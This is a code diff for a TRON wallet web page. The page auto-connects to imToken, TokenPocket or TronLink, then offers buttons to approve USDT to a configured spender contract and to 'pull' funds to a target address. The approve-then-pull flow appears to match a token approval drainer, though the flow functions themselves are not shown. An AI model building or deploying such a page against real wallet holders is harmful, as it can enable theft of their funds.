+  $('btnTP').disabled = false;
+  $('btnIm').classList.remove('dis');
+  $('btnTP').classList.remove('dis');
+
+  // Re-detect env and update UI
+  const env = detectWalletEnvironment();
+  renderEnvPanel(env);
+  updateWalletLabel(env);
+
+  Log.info('App reset');
 }
 
-/* ================================================================
-   APP — public API
-============================================================ */
-const App = {
-  connectWallet(preferred){
-    Log.info('App.connectWallet('+preferred+')');
-    connectWalletFlow(preferred);
-  },
-  doApprove(){
-    Log.info('App.doApprove() — state='+state);
-    if(state!==STATE.READY&&state!==STATE.APPROVE_OK&&state!==STATE.IDLE){
-      // If not connected yet, trigger wallet connection first
-      if(state===STATE.IDLE||!wAddr){
-        Log.info('Not connected — triggering wallet connection first');
-        toast('Please connect wallet first','wn');
-        $('wbtnLabel').textContent='Select a wallet first:';
-        return;
+function updateWalletLabel(env) {
+  if (env.canUseInjectedProvider) {
+    $('wbtnLabel').textContent = 'Wallet detected — connecting...';
+  } else if (env.canUseDeepLink) {
+    $('wbtnLabel').textContent = 'Tap a wallet to open via deeplink';
+  } else if (env.shouldUseWalletConnect) {
+    $('wbtnLabel').textContent = 'Please install TronLink or use wallet DApp browser';
+  } else {
+    $('wbtnLabel').textContent = 'No wallet detected. Please use imToken/TokenPocket DApp browser.';
+  }
+}
+</script>
+
+<!-- ================================================================
+     LAYER 8: EVENT BINDINGS
+     All event listeners are bound here, after all functions exist.
+     This ensures the onclick attributes are NOT the only binding method.
+============================================================ -->
+<script>
+'use strict';
+(function initEvents() {
+  // ---- Wallet buttons ----
+  // These MUST be bound with addEventListener (not just onclick attributes)
+  // because onclick can't be reliably removed/managed.
+
+  $('btnIm').addEventListener('click', function(e) {
+    Log.click('btnIm clicked');
+    e.preventDefault();
+
+    // Guard: if already disabled, ignore
+    if (this.disabled || this.classList.contains('dis')) {
+      Log.warn('btnIm clicked but is disabled — ignored');
+      return;
+    }
+
+    const env = detectWalletEnvironment();
+    Log.info('imToken button clicked. env.walletType=' + env.walletType);
+
+    routeConnect('imtoken');
+  });
+
+  $('btnTP').addEventListener('click', function(e) {
+    Log.click('btnTP clicked');
+    e.preventDefault();
+
+    if (this.disabled || this.classList.contains('dis')) {
+      Log.warn('btnTP clicked but is disabled — ignored');
+      return;
+    }
+
+    const env = detectWalletEnvironment();
+    Log.info('TokenPocket button clicked. env.walletType=' + env.walletType);
+
+    routeConnect('tokenpocket');
+  });
+
+  // ---- Action buttons ----
+  $('btnApprove').addEventListener('click', function(e) {
+    Log.click('btnApprove clicked. state=' + state + ', wAddr=' + wAddr);
+    e.preventDefault();
+
+    if (this.disabled) {
+      Log.warn('btnApprove is disabled — ignored');
+      return;
+    }
+
+    // Guard: must be connected
+    if (!wAddr || !tw) {
+      toast('Please connect wallet first', 'wn');
+      $('wbtnLabel').textContent = 'Connect a wallet first';
+      Log.err('btnApprove clicked but no wallet connected');
+      return;
+    }
+
+    doApproveFlow();
+  });
+
+  $('btnPull').addEventListener('click', function(e) {
+    Log.click('btnPull clicked. state=' + state);
+    e.preventDefault();
+
+    if (this.disabled) {
+      Log.warn('btnPull is disabled — ignored');
+      return;
+    }
+
+    if (!wAddr || !tw) {
+      toast('Please connect wallet first', 'wn');
+      return;
+    }
+
+    doPullFlow();
+  });
+
+  $('btnReset').addEventListener('click', function() {
+    Log.click('btnReset clicked');
+    doReset();
+  });
+
+  // ---- Modal buttons ----
+  $('mBtnNo').addEventListener('click', function() {
+    Log.click('Modal cancel clicked');
+    closeModal();
+  });
+
+  $('mBtnYes').addEventListener('click', function() {
+    Log.click('Modal confirm clicked');
+    closeModal();
+    if (modalCb) {
+      Log.click('Executing modal callback');
+      modalCb();
+    }
+  });
+
+  // ---- Debug panel toggle ----
+  $('dbgHeader').addEventListener('click', function() {
+    toggleDebug();
+  });
+
+  // ---- Modal backdrop click ----
+  $('modal').addEventListener('click', function(e) {
+    if (e.target === this) {
+      closeModal();
+    }
+  });
+
+  // ---- Visibility change: user returned from wallet ----
+  document.addEventListener('visibilitychange', function() {
+    if (document.visibilityState === 'hidden') {
+      Log.info('Page became hidden (user may have switched to wallet app)');
+    }
+    if (document.visibilityState === 'visible') {
+      Log.info('Page became visible again (returned from wallet)');
+      // Re-check environment — maybe wallet was connected while we were hidden
+      if (state === STATE.IDLE || !wAddr) {
+        const env = detectWalletEnvironment();
+        Log.env('Visibility restored — re-checking env', JSON.stringify({
+          canUseInjectedProvider: env.canUseInjectedProvider,
+          walletType: env.walletType,
+        }));
+        if (env.canUseInjectedProvider) {
+          // Try to connect via provider now
+          setTimeout(async () => {
+            Log.info('Auto-connecting after return from wallet...');
+            await connectViaProvider(env);
+          }, 200);
+        }
       }
     }
-    doApproveFlow();
-  },
-  doPull(){
-    Log.info('App.doPull() — state='+state);
-    if(state===STATE.FAIL||state===STATE.DONE)return;
-    doPullFlow();
-  },
-  reset(){
-    closeModal();
-    state=STATE.IDLE;tw=null;wAddr=null;wType=null;lastTx=null;
-    cacheBal=null;cacheAllow=null;modalCb=null;
+  });
 
-    $('connBadge').textContent='Not Connected';
-    $('connBadge').className='badge no';
-    $('netBadge').textContent=CONFIG.NETWORK==='nile'?'Nile':'Mainnet';
-    $('netBadge').className='badge '+(CONFIG.NETWORK==='nile'?'testnet':'mainnet');
+  // ---- Pagehide: similar to visibilitychange, for older browsers ----
+  window.addEventListener('pagehide', function(e) {
+    Log.info('pagehide fired. persisted=' + e.persisted);
+    if (!e.persisted) {
+      sessionStorage.setItem('_wcb_return', '1');
+    }
+  });
 
-    $('walletArea').style.display='block';
-    $('infoArea').classList.add('hd');
-    $('actApprove').style.display='block';
-    $('actPull').classList.add('hd');
-    $('txCard').classList.add('hd');
-    $('balWarn').style.display='none';
-    $('allowWarn').style.display='none';
-    $('pullWarn').style.display='none';
-    $('fallbackBox').classList.add('hd');
-    $('dlCountdown').classList.add('hd');
-    $('wbtnLabel').textContent='Tap a wallet to connect';
-    hideErr();
-    stepAllReset();
-    setBtns(false);
+  // ---- Beforeunload: warn user if transaction is pending ----
+  window.addEventListener('beforeunload', function(e) {
+    if (state === STATE.APPROVING || state === STATE.PULLING) {
+      e.preventDefault();
+      e.returnValue = 'Transaction in progress. Are you sure you want to leave?';
+      Log.warn('beforeunload: transaction in progress, warning shown');
+    }
+  });
 
-    Log.info('App reset');
-  },
-  toggleDebug,
-  closeModal,
-  onModalConfirm(){
-    closeModal();
-    if(modalCb)modalCb();
-  },
-  copyDeeplinkUrl,
-  copyPageUrl,
-};
+  Log.info('All event listeners bound');
+})();
+</script>
 
-/* ================================================================
-   INIT
-============================================================ */
-(function init(){
-  // Log CONFIG validation
-  if(!isAddr(CONFIG.USDT_CONTRACT)){
-    Log.err('[CONFIG] USDT_CONTRACT invalid: '+CONFIG.USDT_CONTRACT);
+<!-- ================================================================
+     LAYER 9: INIT
+============================================================ -->
+<script>
+'use strict';
+(function init() {
+  // Config validation
+  if (!isAddr(CONFIG.USDT_CONTRACT)) {
+    Log.err('[CONFIG] USDT_CONTRACT invalid: ' + CONFIG.USDT_CONTRACT);
   } else {
-    Log.info('[CONFIG] USDT_CONTRACT: '+CONFIG.USDT_CONTRACT);
+    Log.info('[CONFIG] USDT_CONTRACT: ' + CONFIG.USDT_CONTRACT);
   }
-  if(!isAddr(CONFIG.SPENDER_CONTRACT)){
-    Log.err('[CONFIG] SPENDER_CONTRACT not set or invalid');
+  if (!isAddr(CONFIG.SPENDER_CONTRACT)) {
+    Log.err('[CONFIG] SPENDER_CONTRACT not set');
   } else {
-    Log.info('[CONFIG] SPENDER_CONTRACT: '+CONFIG.SPENDER_CONTRACT);
+    Log.info('[CONFIG] SPENDER_CONTRACT: ' + CONFIG.SPENDER_CONTRACT);
   }
-  if(!isAddr(CONFIG.TARGET_ADDRESS)){
-    Log.warn('[CONFIG] TARGET_ADDRESS not set or invalid');
+  if (!isAddr(CONFIG.TARGET_ADDRESS)) {
+    Log.warn('[CONFIG] TARGET_ADDRESS invalid');
   } else {
-    Log.info('[CONFIG] TARGET_ADDRESS: '+CONFIG.TARGET_ADDRESS);
+    Log.info('[CONFIG] TARGET_ADDRESS: ' + CONFIG.TARGET_ADDRESS);
+  }
+  if (CONFIG.NETWORK !== 'nile') {
+    Log.warn('[CONFIG] NETWORK is not nile (is: ' + CONFIG.NETWORK + ')');
   }
 
-  // Detect environment immediately
-  const env=detectWalletEnvironment();
-  Log.env('Initial environment detection',env);
+  // Detect environment
+  const env = detectWalletEnvironment();
+  Log.env('Initial environment detection', JSON.stringify({
+    walletType: env.walletType,
+    isInAppBrowser: env.isInAppBrowser,
+    isSystemBrowser: env.isSystemBrowser,
+    canUseInjectedProvider: env.canUseInjectedProvider,
+    canUseDeepLink: env.canUseDeepLink,
+    recommendedFlow: env.recommendedFlow,
+    hasTronLink: env.hasTronLink,
+    hasTronWeb: env.hasTronWeb,
+    hasTPSDK: env.hasTPSDK,
+    hasImToken: env.hasImToken,
+  }));
+
+  // Render env panel immediately
   renderEnvPanel(env);
-
-  // Update label based on env
-  if(env.canUseInjectedProvider){
-    $('wbtnLabel').textContent='Wallet detected — connecting automatically...';
-  } else if(env.canUseDeepLink){
-    $('wbtnLabel').textContent='Tap a wallet to open via deeplink';
-  } else if(env.shouldUseWalletConnect){
-    $('wbtnLabel').textContent='Please install TronLink or use wallet DApp browser';
-  } else {
-    $('wbtnLabel').textContent='No wallet detected. Please use imToken/TokenPocket DApp browser.';
-  }
+  updateWalletLabel(env);
 
   // Auto-connect if injected provider is available
-  if(env.canUseInjectedProvider){
-    Log.info('Auto-connecting via injected provider...');
-    setTimeout(async()=>{
-      await connectViaInjectedProvider(env);
-    },100);
+  if (env.canUseInjectedProvider) {
+    Log.info('Auto-connecting via injected provider (env=' + env.walletType + ')');
+    $('wbtnLabel').textContent = 'Wallet detected — connecting...';
+
+    setTimeout(async () => {
+      try {
+        await connectViaProvider(env);
+      } catch (e) {
+        const msg = e.message || String(e);
+        Log.err('Auto-connect failed: ' + msg);
+        toast('Auto-connect failed: ' + msg, 'er');
+        $('wbtnLabel').textContent = 'Auto-connect failed. Tap a wallet button.';
+      }
+    }, 50);
   }
 
   // Mobile badge
-  if(env.isMobile){
-    const mb=document.createElement('span');
-    mb.className='badge mobile';
-    mb.textContent='Mobile';
+  if (env.isMobile) {
+    const mb = document.createElement('span');
+    mb.className = 'badge mobile';
+    mb.textContent = 'Mobile';
     $('badgeRow').appendChild(mb);
   }
+
+  // Show recommended flow badge
+  if (env.recommendedFlow === 'deeplink') {
+    const db = document.createElement('span');
+    db.className = 'badge warn';
+    db.textContent = 'DEEPLINK';
+    $('badgeRow').appendChild(db);
+  } else if (env.recommendedFlow === 'injected-provider') {
+    const db = document.createElement('span');
+    db.className = 'badge ok';
+    db.textContent = 'INJECTED';
+    $('badgeRow').appendChild(db);
+  }
+
+  Log.info('Init complete. recommendedFlow=' + env.recommendedFlow);
 })();
 </script>
 </body>
